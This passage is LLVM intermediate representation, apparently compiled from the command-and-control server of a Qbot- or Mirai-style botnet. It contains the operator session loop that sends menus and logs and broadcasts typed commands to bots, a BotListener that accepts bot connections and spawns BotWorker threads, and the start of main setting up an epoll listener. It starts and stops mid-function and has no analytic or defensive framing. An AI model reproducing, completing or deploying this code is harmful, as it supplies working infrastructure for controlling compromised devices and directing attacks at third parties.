  %560 = call i32 (i8*, i8*, ...) @sprintf(i8* %559, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.62, i64 0, i64 0)) #9
  %561 = load i32, i32* %4, align 4
  %562 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %563 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %564 = call i64 @strlen(i8* %563) #8
  %565 = call i64 @send(i32 %561, i8* %562, i64 %564, i32 16384)
  %566 = icmp eq i64 %565, -1
  br i1 %566, label %567, label %568

567:                                              ; preds = %548
  br label %855

568:                                              ; preds = %548
  %569 = load i32, i32* %4, align 4
  %570 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %571 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %572 = call i64 @strlen(i8* %571) #8
  %573 = call i64 @send(i32 %569, i8* %570, i64 %572, i32 16384)
  %574 = icmp eq i64 %573, -1
  br i1 %574, label %575, label %576

575:                                              ; preds = %568
  br label %855

576:                                              ; preds = %568
  %577 = load i32, i32* %4, align 4
  %578 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %579 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %580 = call i64 @strlen(i8* %579) #8
  %581 = call i64 @send(i32 %577, i8* %578, i64 %580, i32 16384)
  %582 = icmp eq i64 %581, -1
  br i1 %582, label %583, label %584

583:                                              ; preds = %576
  br label %855

584:                                              ; preds = %576
  %585 = load i32, i32* %4, align 4
  %586 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %587 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %588 = call i64 @strlen(i8* %587) #8
  %589 = call i64 @send(i32 %585, i8* %586, i64 %588, i32 16384)
  %590 = icmp eq i64 %589, -1
  br i1 %590, label %591, label %592

591:                                              ; preds = %584
  br label %855

592:                                              ; preds = %584
  %593 = load i32, i32* %4, align 4
  %594 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %595 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %596 = call i64 @strlen(i8* %595) #8
  %597 = call i64 @send(i32 %593, i8* %594, i64 %596, i32 16384)
  %598 = icmp eq i64 %597, -1
  br i1 %598, label %599, label %600

599:                                              ; preds = %592
  br label %855

600:                                              ; preds = %592
  %601 = load i8*, i8** %3, align 8
  %602 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %601) #9
  %603 = load i32, i32* %4, align 4
  %604 = call i64 @send(i32 %603, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %605 = icmp eq i64 %604, -1
  br i1 %605, label %606, label %607

606:                                              ; preds = %600
  br label %855

607:                                              ; preds = %600
  br label %306, !llvm.loop !19

608:                                              ; preds = %544
  %609 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %610 = call i8* @strstr(i8* %609, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0)) #8
  %611 = icmp ne i8* %610, null
  br i1 %611, label %612, label %629

612:                                              ; preds = %608
  %613 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %613, i8 0, i64 2048, i1 false)
  %614 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i64 0, i64 0
  %615 = call i32 (i8*, i8*, ...) @sprintf(i8* %614, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.64, i64 0, i64 0)) #9
  %616 = load i32, i32* %4, align 4
  %617 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i64 0, i64 0
  %618 = getelementptr inbounds [2048 x i8], [2048 x i8]* %52, i64 0, i64 0
  %619 = call i64 @strlen(i8* %618) #8
  %620 = call i64 @send(i32 %616, i8* %617, i64 %619, i32 16384)
  %621 = icmp eq i64 %620, -1
  br i1 %621, label %622, label %623

622:                                              ; preds = %612
  br label %855

623:                                              ; preds = %612
  %624 = load i32, i32* %4, align 4
  %625 = call i64 @send(i32 %624, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %626 = icmp eq i64 %625, -1
  br i1 %626, label %627, label %628

627:                                              ; preds = %623
  br label %855

628:                                              ; preds = %623
  br label %306, !llvm.loop !19

629:                                              ; preds = %608
  %630 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %631 = call i8* @strstr(i8* %630, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i64 0, i64 0)) #8
  %632 = icmp ne i8* %631, null
  br i1 %632, label %633, label %740

633:                                              ; preds = %629
  %634 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %634, i8 0, i64 2048, i1 false)
  %635 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %636 = call i32 (i8*, i8*, ...) @sprintf(i8* %635, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i64 0, i64 0)) #9
  %637 = load i32, i32* %4, align 4
  %638 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %639 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %640 = call i64 @strlen(i8* %639) #8
  %641 = call i64 @send(i32 %637, i8* %638, i64 %640, i32 16384)
  %642 = icmp eq i64 %641, -1
  br i1 %642, label %643, label %644

643:                                              ; preds = %633
  br label %855

644:                                              ; preds = %633
  %645 = load i32, i32* %4, align 4
  %646 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %647 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %648 = call i64 @strlen(i8* %647) #8
  %649 = call i64 @send(i32 %645, i8* %646, i64 %648, i32 16384)
  %650 = icmp eq i64 %649, -1
  br i1 %650, label %651, label %652

651:                                              ; preds = %644
  br label %855

652:                                              ; preds = %644
  %653 = load i32, i32* %4, align 4
  %654 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %655 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %656 = call i64 @strlen(i8* %655) #8
  %657 = call i64 @send(i32 %653, i8* %654, i64 %656, i32 16384)
  %658 = icmp eq i64 %657, -1
  br i1 %658, label %659, label %660

659:                                              ; preds = %652
  br label %855

660:                                              ; preds = %652
  %661 = load i32, i32* %4, align 4
  %662 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %663 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %664 = call i64 @strlen(i8* %663) #8
  %665 = call i64 @send(i32 %661, i8* %662, i64 %664, i32 16384)
  %666 = icmp eq i64 %665, -1
  br i1 %666, label %667, label %668

667:                                              ; preds = %660
  br label %855

668:                                              ; preds = %660
  %669 = load i32, i32* %4, align 4
  %670 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %671 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %672 = call i64 @strlen(i8* %671) #8
  %673 = call i64 @send(i32 %669, i8* %670, i64 %672, i32 16384)
  %674 = icmp eq i64 %673, -1
  br i1 %674, label %675, label %676

675:                                              ; preds = %668
  br label %855

676:                                              ; preds = %668
  %677 = load i32, i32* %4, align 4
  %678 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %679 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %680 = call i64 @strlen(i8* %679) #8
  %681 = call i64 @send(i32 %677, i8* %678, i64 %680, i32 16384)
  %682 = icmp eq i64 %681, -1
  br i1 %682, label %683, label %684

683:                                              ; preds = %676
  br label %855

684:                                              ; preds = %676
  %685 = load i32, i32* %4, align 4
  %686 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %687 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %688 = call i64 @strlen(i8* %687) #8
  %689 = call i64 @send(i32 %685, i8* %686, i64 %688, i32 16384)
  %690 = icmp eq i64 %689, -1
  br i1 %690, label %691, label %692

691:                                              ; preds = %684
  br label %855

692:                                              ; preds = %684
  %693 = load i32, i32* %4, align 4
  %694 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %695 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %696 = call i64 @strlen(i8* %695) #8
  %697 = call i64 @send(i32 %693, i8* %694, i64 %696, i32 16384)
  %698 = icmp eq i64 %697, -1
  br i1 %698, label %699, label %700

699:                                              ; preds = %692
  br label %855

700:                                              ; preds = %692
  %701 = load i32, i32* %4, align 4
  %702 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %703 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %704 = call i64 @strlen(i8* %703) #8
  %705 = call i64 @send(i32 %701, i8* %702, i64 %704, i32 16384)
  %706 = icmp eq i64 %705, -1
  br i1 %706, label %707, label %708

707:                                              ; preds = %700
  br label %855

708:                                              ; preds = %700
  %709 = load i32, i32* %4, align 4
  %710 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %711 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %712 = call i64 @strlen(i8* %711) #8
  %713 = call i64 @send(i32 %709, i8* %710, i64 %712, i32 16384)
  %714 = icmp eq i64 %713, -1
  br i1 %714, label %715, label %716

715:                                              ; preds = %708
  br label %855

716:                                              ; preds = %708
  %717 = load i32, i32* %4, align 4
  %718 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %719 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %720 = call i64 @strlen(i8* %719) #8
  %721 = call i64 @send(i32 %717, i8* %718, i64 %720, i32 16384)
  %722 = icmp eq i64 %721, -1
  br i1 %722, label %723, label %724

723:                                              ; preds = %716
  br label %855

724:                                              ; preds = %716
  br label %725

725:                                              ; preds = %724
  %726 = load i32, i32* %4, align 4
  %727 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %728 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %729 = call i64 @strlen(i8* %728) #8
  %730 = call i64 @send(i32 %726, i8* %727, i64 %729, i32 16384)
  %731 = icmp eq i64 %730, -1
  br i1 %731, label %732, label %733

732:                                              ; preds = %725
  br label %855

733:                                              ; preds = %725
  %734 = load i32, i32* %4, align 4
  %735 = call i64 @send(i32 %734, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %736 = icmp eq i64 %735, -1
  br i1 %736, label %737, label %738

737:                                              ; preds = %733
  br label %855

738:                                              ; preds = %733
  br label %739

739:                                              ; preds = %738
  br label %306, !llvm.loop !19

740:                                              ; preds = %629
  %741 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %742 = call i8* @strstr(i8* %741, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #8
  %743 = icmp ne i8* %742, null
  br i1 %743, label %744, label %764

744:                                              ; preds = %740
  %745 = load i8*, i8** %3, align 8
  %746 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %745) #9
  %747 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %748 = call i32 (i8*, i8*, ...) @sprintf(i8* %747, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.68, i64 0, i64 0)) #9
  %749 = load i32, i32* %4, align 4
  %750 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %751 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %752 = call i64 @strlen(i8* %751) #8
  %753 = call i64 @send(i32 %749, i8* %750, i64 %752, i32 16384)
  %754 = icmp eq i64 %753, -1
  br i1 %754, label %755, label %756

755:                                              ; preds = %744
  br label %855

756:                                              ; preds = %744
  %757 = load i8*, i8** %3, align 8
  %758 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %757) #9
  %759 = load i32, i32* %4, align 4
  %760 = call i64 @send(i32 %759, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %761 = icmp eq i64 %760, -1
  br i1 %761, label %762, label %763

762:                                              ; preds = %756
  br label %855

763:                                              ; preds = %756
  br label %306, !llvm.loop !19

764:                                              ; preds = %740
  %765 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %766 = call i8* @strstr(i8* %765, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i64 0, i64 0)) #8
  %767 = icmp ne i8* %766, null
  br i1 %767, label %768, label %788

768:                                              ; preds = %764
  %769 = load i8*, i8** %3, align 8
  %770 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %769) #9
  %771 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i64 0, i64 0
  %772 = call i32 (i8*, i8*, ...) @sprintf(i8* %771, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.70, i64 0, i64 0)) #9
  %773 = load i32, i32* %4, align 4
  %774 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i64 0, i64 0
  %775 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i64 0, i64 0
  %776 = call i64 @strlen(i8* %775) #8
  %777 = call i64 @send(i32 %773, i8* %774, i64 %776, i32 16384)
  %778 = icmp eq i64 %777, -1
  br i1 %778, label %779, label %780

779:                                              ; preds = %768
  br label %855

780:                                              ; preds = %768
  %781 = load i8*, i8** %3, align 8
  %782 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %781) #9
  %783 = load i32, i32* %4, align 4
  %784 = call i64 @send(i32 %783, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 12, i32 16384)
  %785 = icmp eq i64 %784, -1
  br i1 %785, label %786, label %787

786:                                              ; preds = %780
  br label %855

787:                                              ; preds = %780
  br label %306, !llvm.loop !19

788:                                              ; preds = %764
  %789 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %790 = call i8* @strstr(i8* %789, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #8
  %791 = icmp ne i8* %790, null
  br i1 %791, label %792, label %810

792:                                              ; preds = %788
  %793 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %793, i8 0, i64 2048, i1 false)
  %794 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %795 = load i32, i32* %5, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %796
  %798 = getelementptr inbounds %struct.login_info, %struct.login_info* %797, i32 0, i32 0
  %799 = getelementptr inbounds [20 x i8], [20 x i8]* %798, i64 0, i64 0
  %800 = call i32 (i8*, i8*, ...) @sprintf(i8* %794, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.72, i64 0, i64 0), i8* %799) #9
  %801 = load i32, i32* %4, align 4
  %802 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %803 = getelementptr inbounds [2048 x i8], [2048 x i8]* %56, i64 0, i64 0
  %804 = call i64 @strlen(i8* %803) #8
  %805 = call i64 @send(i32 %801, i8* %802, i64 %804, i32 16384)
  %806 = icmp eq i64 %805, -1
  br i1 %806, label %807, label %808

807:                                              ; preds = %792
  br label %855

808:                                              ; preds = %792
  %809 = call i32 @sleep(i32 5)
  br label %855

810:                                              ; preds = %788
  %811 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %811)
  %812 = load i32, i32* %4, align 4
  %813 = call i64 @send(i32 %812, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i64 11, i32 16384)
  %814 = icmp eq i64 %813, -1
  br i1 %814, label %815, label %816

815:                                              ; preds = %810
  br label %855

816:                                              ; preds = %810
  %817 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %818 = call i64 @strlen(i8* %817) #8
  %819 = icmp eq i64 %818, 0
  br i1 %819, label %820, label %821

820:                                              ; preds = %816
  br label %306, !llvm.loop !19

821:                                              ; preds = %816
  %822 = load i32, i32* %5, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %823
  %825 = getelementptr inbounds %struct.login_info, %struct.login_info* %824, i32 0, i32 0
  %826 = getelementptr inbounds [20 x i8], [20 x i8]* %825, i64 0, i64 0
  %827 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %828 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i64 0, i64 0), i8* %826, i8* %827)
  %829 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.74, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i64 0, i64 0))
  store %struct._IO_FILE* %829, %struct._IO_FILE** %57, align 8
  %830 = call i64 @time(i64* null) #9
  store i64 %830, i64* %58, align 8
  %831 = call %struct.tm* @gmtime(i64* %58) #9
  store %struct.tm* %831, %struct.tm** %59, align 8
  %832 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i64 0, i64 0
  %833 = load %struct.tm*, %struct.tm** %59, align 8
  %834 = call i64 @strftime(i8* %832, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0), %struct.tm* %833) #9
  %835 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %836 = getelementptr inbounds [50 x i8], [50 x i8]* %60, i64 0, i64 0
  %837 = load i32, i32* %5, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %838
  %840 = getelementptr inbounds %struct.login_info, %struct.login_info* %839, i32 0, i32 0
  %841 = getelementptr inbounds [20 x i8], [20 x i8]* %840, i64 0, i64 0
  %842 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %843 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %835, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i64 0, i64 0), i8* %836, i8* %841, i8* %842)
  %844 = load %struct._IO_FILE*, %struct._IO_FILE** %57, align 8
  %845 = call i32 @fclose(%struct._IO_FILE* %844)
  %846 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %847 = load i32, i32* %4, align 4
  %848 = load i32, i32* %5, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %849
  %851 = getelementptr inbounds %struct.login_info, %struct.login_info* %850, i32 0, i32 0
  %852 = getelementptr inbounds [20 x i8], [20 x i8]* %851, i64 0, i64 0
  call void @broadcast(i8* %846, i32 %847, i8* %852)
  %853 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %853, i8 0, i64 2048, i1 false)
  br label %306, !llvm.loop !19

854:                                              ; preds = %306
  br label %855

855:                                              ; preds = %854, %815, %808, %807, %786, %779, %762, %755, %737, %732, %723, %715, %707, %699, %691, %683, %675, %667, %659, %651, %643, %627, %622, %606, %599, %591, %583, %575, %567, %542, %535, %527, %519, %511, %503, %495, %487, %479, %471, %463, %455, %447, %439, %431, %423, %415, %407, %355, %332, %297, %292, %283, %275, %267, %259, %251, %243, %235, %227, %219, %211, %172, %171, %161, %142, %136, %111, %105
  %856 = load i32, i32* %4, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %857
  %859 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %858, i32 0, i32 0
  store i32 0, i32* %859, align 4
  %860 = load i32, i32* %4, align 4
  %861 = call i32 @close(i32 %860)
  %862 = load volatile i32, i32* @OperatorsConnected, align 4
  %863 = add nsw i32 %862, -1
  store volatile i32 %863, i32* @OperatorsConnected, align 4
  br label %864

864:                                              ; preds = %855, %350, %327
  %865 = load i8*, i8** %2, align 8
  ret i8* %865
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.78, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.80, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.81, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 %47, i32 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 %62, i32 1, i32 %63, %struct.epoll_event* %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
